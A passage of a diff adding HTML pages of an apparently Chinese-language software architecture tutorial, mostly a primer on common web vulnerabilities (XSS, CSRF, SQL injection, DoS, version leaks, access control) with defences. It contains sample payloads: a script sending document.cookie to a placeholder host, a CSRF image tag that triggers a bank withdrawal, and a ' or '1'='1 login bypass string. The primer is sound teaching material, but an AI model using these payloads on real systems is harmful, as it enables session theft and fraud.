+} <strong>finally</strong> {<br>
+<strong>int</strong> cost = (<strong>int</strong>) (System.<em>currentTimeMillis</em>() - begin);<br>
+Monitor.<em>max</em>(<strong><em>MAX_COSTTIME</em></strong>, cost);<br>
+Monitor.<em>avg</em>(<strong><em>AVG_COSTTIME</em></strong>, cost);<br>
+}<br>
+<strong>return &quot;&quot;</strong>;<br>
+}</p>
+<hr>
+<p>二、注解</p>
+<hr>
+<p>@MonitorItem(CountId = 1, MaxCost = 2, AvgCost = 3, ExceptionCount = 4)<br>
+<strong>public</strong> String getUser() {<br>
+<strong>return &quot;&quot;</strong>;<br>
+}</p>
+<hr>
+<p>通过切面实现。</p>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之案例实践篇"></a><a href="#智能互联网之案例实践篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之案例实践篇</h1>
+<h2><a class="anchor" aria-hidden="true" id="推送系统总体设计与详细设计"></a><a href="#推送系统总体设计与详细设计" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>推送系统总体设计与详细设计</h2>
+<h2><a class="anchor" aria-hidden="true" id="空间用户体系总体设计"></a><a href="#空间用户体系总体设计" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>空间用户体系总体设计</h2>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之开源框架架构演练篇"></a><a href="#智能互联网之开源框架架构演练篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之开源框架+架构演练篇</h1>
+<h2><a class="anchor" aria-hidden="true" id="开发框架选择"></a><a href="#开发框架选择" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>开发框架选择</h2>
+<h2><a class="anchor" aria-hidden="true" id="web框架spring-boot实践"></a><a href="#web框架spring-boot实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Web框架Spring Boot实践</h2>
+<h2><a class="anchor" aria-hidden="true" id="rpc框架实践"></a><a href="#rpc框架实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>RPC框架实践</h2>
+<h2><a class="anchor" aria-hidden="true" id="安全专题篇"></a><a href="#安全专题篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全专题篇</h2>
+<h2><a class="anchor" aria-hidden="true" id="服务治理存储专题篇"></a><a href="#服务治理存储专题篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务治理存储专题篇</h2>
+<h2><a class="anchor" aria-hidden="true" id="面试专题篇"></a><a href="#面试专题篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>面试专题篇</h2>
+<h2><a class="anchor" aria-hidden="true" id="其它"></a><a href="#其它" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>其它</h2>
+<h1><a class="anchor" aria-hidden="true" id="常见安全漏洞"></a><a href="#常见安全漏洞" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>常见安全漏洞</h1>
+<h2><a class="anchor" aria-hidden="true" id="xss跨站脚本工具漏洞"></a><a href="#xss跨站脚本工具漏洞" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>XSS跨站脚本工具漏洞</h2>
+<p>跨站脚本攻击(Cross-Site Scripting,
+XSS)，可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和
+JavaScript。</p>
+<p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
+<p>&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; +
+document.cookie&lt;/script&gt;</p>
+<p>之后该内容可能会被渲染成以下形式:</p>
+<p>&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; +
+document.cookie&lt;/script&gt;&lt;/p&gt;</p>
+<p>另一个用户浏览了含有这个内容的页面将会跳转到domain.com并携带了当前作用域的Cookie。如果这个论坛网站通过Cookie管理用户登录状态，那么攻击者就可以通过这个Cookie登录被攻击者的账号了。</p>
+<p>防范手段：</p>
+<ol>
+<li>Cookie设置HttpOnly</li>
+</ol>
+<blockquote>
+<p>2、特殊字符过滤</p>
+<p>例如将&lt;转义为&lt;，将&gt;转义为&gt;，从而避免HTML和JavaScript代码的运行。</p>
+</blockquote>
+<p>富文本编辑器允许用户输入HTML代码，就不能简单地将&lt;等字符进行过滤了，极大地提高了XSS攻击的可能性。富文本编辑器通常采用XSS
+filter来防范XSS攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的HTML代码的输入。</p>
+<h2><a class="anchor" aria-hidden="true" id="csrf跨站请求伪造【中风险】"></a><a href="#csrf跨站请求伪造【中风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSRF跨站请求伪造【中风险】</h2>
+<p>跨站请求伪造(Cross-site request
+forgery，CSRF)，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。XSS利用的是用户对指定网站的信任，CSRF利用的是网站对用户浏览器的信任。</p>
+<p><strong>攻击原理</strong></p>
+<p>假如一家银行用以执行转账操作的URL地址如下:</p>
+<p><a href="http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</a>。那么，一个恶意攻击者可以在另一个网站上放置如下代码:</p>
+<p>&lt;img
+src=&quot;<a href="http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman">http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman</a>&quot;&gt;。如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000美元。</p>
+<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
+<p>通过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<p>程序的重要业务操作没有验证请求来源，也未包含随机令牌。</p>
+<p><img src="media/image86.tiff" alt="">{width=&quot;5.464762685914261in&quot;
+height=&quot;2.119032152230971in&quot;}</p>
+<p>安全建议：</p>
+<p>服务端的防御：</p>
+<blockquote>
+<p>验证HTTP Referer字段。</p>
+<p>请求地址中添加token并验证（token不放在cookie中，放在http请求参数中，服务端对其进行验证）</p>
+<p>将token加入http头属性中，避免了token出现在浏览器中，被泄露。</p>
+<p>客户端防御：</p>
+<p>为了配合服务端对token的验证，那么客户端也需要在访问时生成token，这是利用
+js 来给 html 中的链接和表单请求地址附加 csrftoken 代码，其中已定义
+token 为全局变量，其值可以从 session 中得到。</p>
+</blockquote>
+<h2><a class="anchor" aria-hidden="true" id="sql注入"></a><a href="#sql注入" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQL注入</h2>
+<blockquote>
+<p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
+<p>比如一个网站的登录验证是这样拼接sql的：</p>
+</blockquote>
+<hr>
+<p>String name = <strong>&quot;admin&quot;</strong>;<br>
+String password = <strong>&quot;123&quot;</strong>;<br>
+String sql = <strong>&quot;select * from user where name = '&quot;</strong> + name + <strong>&quot;' and password = '&quot;</strong> + password + <strong>&quot;'&quot;</strong>;<br>
+System.<strong><em>out</em></strong>.println(sql);<br>
+<br>
+name = <strong>&quot;admin&quot;</strong>;<br>
+password = <strong>&quot;' or '1' = '1&quot;</strong>;<br>
+sql = <strong>&quot;select * from user where name = '&quot;</strong> + name + <strong>&quot;' and password = '&quot;</strong> + password + <strong>&quot;'&quot;</strong>;<br>
+System.<strong><em>out</em></strong>.println(sql);</p>
+<hr>
+<p>正常输入的时候，执行的sql为：</p>
+<p>select * from user where name = 'admin' and password =
+'123'，是没有问题的。</p>
+<p>如果通过刻意伪造，把password传成【<strong>' or '1' = '1</strong>】，执行的sql为：</p>
+<p>select * from user where name = 'admin' and password = '' or '1'
+= '1'，这样就肯定能查出来数据。</p>
+<p><strong>防范手段：禁止使用sql拼接，而采用变量替换的形式的。</strong></p>
+<p>Java中的PreparedStatement是预先编译的SQL语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止SQL注入的发生。</p>
+<p>另外，代码中不可能完全消除sql拼接，比如分表中拼接表名，这时候要进行严格的参数校验。</p>
+<h2><a class="anchor" aria-hidden="true" id="拒绝服务攻击"></a><a href="#拒绝服务攻击" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>拒绝服务攻击</h2>
+<h3><a class="anchor" aria-hidden="true" id="dos攻击"></a><a href="#dos攻击" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DOS攻击</h3>
+<p>拒绝服务攻击（denial-of-service
+attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，
+使服务暂时中断或停止，导致其正常用户无法访问。攻击的效果是使得计算机或网络无法提供正常的服务。常见的DOS攻击有针对计算机网络带宽和连通性的攻击。DOS是单机于单机之间的攻击。</p>
+<p>DOS攻击的原理：首先攻击者向被攻击的服务器发送大量的虚假IP请求，被攻击者在收到请求后返回确认信息，等待攻击者进行确认，（此处需要拥有HTTP协议工作方式和TCP三次握手的基本知识）该过程需要TCP的三次握手，由于攻击者发送的请求信息是虚假的，所以服务器接收不到返回的确认信息，在一段时间内服务器会处与等待状态，而分配给这次请求的资源却被没有被释放。当被攻击者等待一定的时间后，会因连接超时而断开，这时攻击者在次发送新的虚假信息请求，这样最终服务器资源被耗尽，直到瘫痪。</p>
+<h3><a class="anchor" aria-hidden="true" id="ddos"></a><a href="#ddos" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DDoS</h3>
+<p>分布式拒绝服务攻击（distributed denial-of-service
+attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作
+为&quot;僵尸&quot;向特定的目标发动&quot;拒绝服务&quot;式攻击。</p>
+<h2><a class="anchor" aria-hidden="true" id="中间件程序版本信息泄漏【低风险】"></a><a href="#中间件程序版本信息泄漏【低风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>中间件程序版本信息泄漏【低风险】</h2>
+<h3><a class="anchor" aria-hidden="true" id="未设置统一的错误提示页"></a><a href="#未设置统一的错误提示页" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>未设置统一的错误提示页</h3>
+<p>系统没有设置统一的错误提示页面，在404、302、500等错误页面中将直接显示系统使用的中间件的版本信息。另外，在HTTP响应数据包的Header部分也可能泄漏中间件的版本信息。</p>
+<p><img src="media/image87.png" alt="">{width=&quot;3.9575492125984253in&quot;
+height=&quot;0.8089140419947507in&quot;}</p>
+<p><strong>解决方法：</strong>设置统一的错误提示页，可在Nginx的server中配置统一的错误指向页面。</p>
+<p><img src="media/image88.png" alt="">{width=&quot;2.8064206036745407in&quot;
+height=&quot;0.7596325459317586in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="response-headers中的server信息暴露了中间件的版本"></a><a href="#response-headers中的server信息暴露了中间件的版本" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Response Headers中的Server信息暴露了中间件的版本</h3>
+<p><img src="media/image89.png" alt="">{width=&quot;2.280465879265092in&quot;
+height=&quot;0.9326082677165355in&quot;}</p>
+<p>在Nginx中：修改fastcgi.conf配置文件。配置项：</p>
+<p><em>fastcgi_param SERVER_SOFTWARE nginx/$nginx_version;</em></p>
+<h2><a class="anchor" aria-hidden="true" id="jquery版本泄露"></a><a href="#jquery版本泄露" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>jQuery版本泄露</h2>
+<p>jQuery中可能会存在漏洞，所以需要隐藏jQuery版本信息。</p>
+<h2><a class="anchor" aria-hidden="true" id="越权访问【中风险】"></a><a href="#越权访问【中风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>越权访问【中风险】</h2>
+<p>系统并没有判断用户登录状态或访问权限，导致越权访问。</p>
+<p>一：未判断用户登录状态而造成的越权访问</p>
+<p>目前web的登录状态判断都是通过filter或类filter机制实现的，造成这种越权访问的原因就是过滤不严，梳理并修改过滤规则即可。</p>
+<p>二、用户已登录，在没有该菜单权限的基础上，直接通过菜单url访问造成的越权访问</p>
+<p>1）如果该web是jsp，可以在后台添加过滤器拦截</p>
+<h2><a class="anchor" aria-hidden="true" id="系统无超时退出功能【低风险】"></a><a href="#系统无超时退出功能【低风险】" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>系统无超时退出功能【低风险】</h2>
+<p>不具备超时退出功能的应用系统很可能被攻击者利用进行身份冒用，进而进行进一步的利用。安全建议：修改程序源代码，添加超时退出功能，比如登录后30分钟无动作则关闭会话。</p>
